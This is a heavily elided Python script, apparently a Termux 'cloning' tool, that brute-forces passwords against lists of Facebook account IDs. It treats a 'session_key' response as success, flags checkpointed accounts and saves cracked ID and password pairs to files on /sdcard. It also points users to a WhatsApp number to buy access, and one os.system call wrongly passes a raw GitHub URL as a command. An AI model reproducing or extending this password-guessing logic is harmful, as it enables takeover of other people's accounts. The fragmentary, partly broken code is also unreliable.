#coding = utf-8
#tnx alot janj MR.AHSAM
#script shared by AHSAM
...
def qsbuy():
	try:
		...
		try:
			...
			os.system(f"termux-open-url https://wa.me/+923411471937?text={bumper}")
			qsbuy()
...
def main():
	...
	if menu_opt =='1':
		...
		xchker()
		os.system('https://raw.githubusercontent.com/MR-AUH404/paid-200/main/aproved.txt')
		main()
	elif menu_opt =='4':
...
def method_crack():
	os.system('clear')
	print(logo);xchker()
	print(' [1] Friend list File Cloning ')
...
class crack_main():
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[AUH] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					print(' \033[1;32m[AUH-OK] '+roid+' | '+pas+'\033[0;97m')
				...
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[AUH-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/auh_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/auh_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
